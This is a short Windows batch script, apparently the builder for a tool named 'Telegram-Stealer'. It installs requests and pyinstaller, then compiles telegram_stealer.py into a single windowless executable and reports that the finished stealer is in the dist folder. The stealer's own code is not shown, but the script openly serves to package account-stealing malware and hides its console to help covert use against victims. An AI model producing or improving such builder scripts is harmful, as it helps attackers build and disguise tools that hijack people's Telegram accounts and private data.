@echo off
title Telegram-Stealer builder (by create vza3464)
echo Telegram-Stealer build...

pip install requests
pip install pyinstaller

pyinstaller --onefile --noconsole telegram_stealer.py
cls
echo Your stealer is located in the "dist" folder.
pause